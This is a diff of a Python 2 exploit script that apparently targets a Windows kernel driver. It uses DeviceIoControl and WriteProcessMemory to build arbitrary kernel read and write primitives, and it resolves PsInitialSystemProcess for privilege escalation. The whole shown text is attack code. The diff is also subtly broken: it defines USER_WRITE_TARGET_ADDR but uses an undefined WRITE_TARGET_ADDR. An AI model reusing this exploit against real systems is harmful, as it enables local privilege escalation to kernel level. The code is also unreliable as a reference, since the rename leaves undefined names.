@@ -35,8 +35,9 @@ ThreadBasicInformation = 0
 ################################################### ADDRESSES FOR MSDN ######################################################
 
 USER_ADDR = 0x000000001a000000
-WHAT_ADDR = 0x000000001a001000 # Arbitrary offset inside BASEADDRESS 
-USER_MEM_PAGE_PTR = 0x000000001a000500 # Requires 16 byte offset in our defined user memory.
+USER_WRITE_TARGET_ADDR = USER_ADDR + 0x1000 # Arbitrary offset inside BASEADDRESS 
+KERNEL_WRITE_TARGET_ADDR = 0x00 #We don't know this yet.
+USER_MEM_PAGE_PTR = USER_ADDR + 0x500 # Requires 16 byte offset in our defined user memory.
 CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF
 BASEADDRESS = c_ulonglong(USER_ADDR)
 ALLOCATED_USER_MEM_SZ = c_ulonglong(0x3000)
@@ -182,10 +183,10 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
 def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x4242424242424242):
     
-    # Write the what value to WHAT_ADDR
+    # Write the what value to WRITE_TARGET_ADDR
 
     data = struct.pack("<Q", what)
-    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, WHAT_ADDR, data, len(data), byref(written))
+    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, WRITE_TARGET_ADDR, data, len(data), byref(written))
     
     if dwStatus == 0:
         print("Something went wrong while writing to memory","e")
@@ -193,7 +194,7 @@ def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x424242424242
 
     # Pack the address of the what value and the USER_MEM_PAGE_PTR address
 
-    data = struct.pack("<Q", WHAT_ADDR) + struct.pack("<Q", USER_MEM_PAGE_PTR)
+    data = struct.pack("<Q", WRITE_TARGET_ADDR) + struct.pack("<Q", USER_MEM_PAGE_PTR)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
     if dwStatus == 0:
         print("Something went wrong while writing to memory in the packing section","e")
@@ -209,14 +210,14 @@ def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x424242424242
 
     print "Value before DeviceIoControl: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-    print "Our memory target is: " + str(hex(WHAT_ADDR))
+    print "Our memory target is: " + str(hex(WRITE_TARGET_ADDR))
     print "I wrote this to our memory target: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
 ################################################### READ ###########################################################
                           # What is it you want to read? #We are writing it back to userland memory.
 
-def readPrimitive(driver, WHAT_ADDR, USER_MEM_PAGE_PTR):
+def readPrimitive(driver, WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR):
 
     IoControlCode = IOCTL_code
     InputBuffer = c_void_p(1)
@@ -226,7 +227,7 @@ def readPrimitive(driver, WHAT_ADDR, USER_MEM_PAGE_PTR):
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-    data = struct.pack('<QQ', WHAT_ADDR, USER_MEM_PAGE_PTR)
+    data = struct.pack('<QQ', WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE,
             USER_ADDR, data, len(data), byref(written))
 
